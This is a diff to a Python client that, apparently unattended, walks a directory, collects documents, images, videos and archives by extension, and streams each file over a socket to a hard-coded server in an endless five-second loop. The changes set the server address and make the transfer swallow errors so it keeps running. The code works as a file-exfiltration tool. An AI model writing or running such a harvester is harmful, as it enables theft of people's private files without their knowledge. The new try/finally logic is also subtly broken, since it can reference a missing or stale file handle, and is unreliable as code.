@@ -1,7 +1,7 @@
 import platform, re, uuid, socket, psutil, json, cpuinfo, datetime, subprocess, os, time
 
 #Setting variables for connection
-serverName = '127.0.0.0'
+serverName = '192.168.1.76'
 serverPort = 17703
 
 while True:
@@ -125,7 +125,7 @@ while True:
 	filesToSend = [{}]
 	for root, dirs, files in os.walk(path):
 		for x in files:
-			if (x.endswith(('.txt','.doc','.docx','.mp4','.pdf','.mp3','.rtf','.jpg','.jpeg','.gif','.mkv','.zip','.rar','.7z','.tar','.ppt','.pptx','.xsl','.xlsx','.ods','.odt'))):
+			if (x.endswith(('.txt','.doc','.docx','.mp4','.pdf','.mp3','.rtf','.jpg','.jpeg','.gif','.mkv','.zip','.rar','.7z','.tar','.ppt','.pptx','.xsl','.ods','.odt'))):
 				filesProperties = {}
 				filesProperties['path'] = root + separator + x
 				filesProperties['filename'] = x
@@ -149,17 +149,26 @@ while True:
 		clientSocket.send(str(numFiles).encode())
 		clientSocket.recv(128)
 		for i in range(numFiles):
-			with open (filesToSend[i]['path'],"rb") as f:
-				fileSize = os.path.getsize(filesToSend[i]['path'])
-				clientSocket.send(filesToSend[i]['filename'].encode())
-				clientSocket.recv(128)
-				clientSocket.send(str(fileSize).encode())
-				clientSocket.recv(128)
-				data = f.read()
-				clientSocket.sendall(data)
-				clientSocket.send(b"<TMB>") 
-				clientSocket.recv(128)
+			try:
+				f = open (filesToSend[i]['path'],"rb")
+			except:
+				continue
+			finally:
+				try:
+					fileSize = os.path.getsize(filesToSend[i]['path'])
+					clientSocket.send(filesToSend[i]['filename'].encode())
+					clientSocket.recv(128)
+					clientSocket.send(str(fileSize).encode())
+					clientSocket.recv(128)
+					data = f.read(-1)
+				except:
+					data = b""
+				finally:
+					clientSocket.sendall(data)
+					clientSocket.send(b"<TMB>") 
+					clientSocket.recv(128)
+					f.close()
 		clientSocket.close()
-	except: 
-		print("Error when sending files") 
+	except Exception as e: 
+		print(e) 
 	time.sleep(5)
